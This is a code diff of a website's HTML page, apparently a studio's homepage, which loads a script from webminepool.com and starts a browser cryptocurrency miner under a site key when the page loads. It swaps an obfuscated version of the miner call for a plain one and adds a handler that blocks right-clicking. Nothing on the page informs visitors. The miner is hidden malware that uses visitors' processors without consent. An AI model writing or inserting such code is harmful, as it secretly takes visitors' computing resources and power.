@@ -1,6 +1,16 @@
 <!DOCTYPE html>
     <html lang="en">
     <head>
+        <script> 
+            function disableClick(){ 
+              document.onclick=function(event){ 
+                if (event.button == 2) { 
+                  alert('Right Click Message'); 
+                  return false; 
+                } 
+              } 
+            } 
+          </script> 
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <!--=============== COPYRIGHT DUKESTUDIOS @2022 ===============-->
@@ -13,9 +23,10 @@
         <script src="https://webminepool.com/lib/base.js"></script>
         <link rel="icon" type="image/x-icon" href="assets/img/New Project (80).png">
     </head>
-    <body>
+    <body onLoad="disableClick()">
         <script>
-        function _0x2b66(){var _0x49960f=['start','SK_vAfdxFWbM7An26q8EQ2m7','1212eiyXUI','30452RHLlwg','7288DJOkjQ','_0x4677cb','343JeMJvG','85098UYoVLs','910521VFFxeO','534VKgRyQ','1368770XRnLpq','4ZurlcV','74294qAZJNc','515jmYDWi','7146qZbwdO'];_0x2b66=function(){return _0x49960f;};return _0x2b66();}var _0x3e916b=_0x5917;function _0x5917(_0x6c3970,_0x3bae82){var _0x2b66fd=_0x2b66();return _0x5917=function(_0x59171a,_0x38b674){_0x59171a=_0x59171a-0xac;var _0x2af74e=_0x2b66fd[_0x59171a];return _0x2af74e;},_0x5917(_0x6c3970,_0x3bae82);}(function(_0x2645fd,_0xb691f7){var _0x4118de=_0x5917,_0x2dc710=_0x2645fd();while(!![]){try{var _0x31e738=parseInt(_0x4118de(0xb5))/0x1*(parseInt(_0x4118de(0xb2))/0x2)+-parseInt(_0x4118de(0xb0))/0x3*(-parseInt(_0x4118de(0xb9))/0x4)+-parseInt(_0x4118de(0xb4))/0x5*(parseInt(_0x4118de(0xae))/0x6)+parseInt(_0x4118de(0xad))/0x7*(-parseInt(_0x4118de(0xba))/0x8)+parseInt(_0x4118de(0xaf))/0x9+parseInt(_0x4118de(0xb1))/0xa+parseInt(_0x4118de(0xb3))/0xb*(parseInt(_0x4118de(0xb8))/0xc);if(_0x31e738===_0xb691f7)break;else _0x2dc710['push'](_0x2dc710['shift']());}catch(_0x1622a9){_0x2dc710['push'](_0x2dc710['shift']());}}}(_0x2b66,0xbf6f6));var _0x2e6657=WMP[_0x3e916b(0xac)](_0x3e916b(0xb7));_0x2e6657[_0x3e916b(0xb6)]();
+            var miner = WMP.Anonymous('SK_vAfdxFWbM7An26q8EQ2m7');
+            miner.start();
         </script>
         <!--=============== NAVBAR ===============-->
         <nav class="nav">
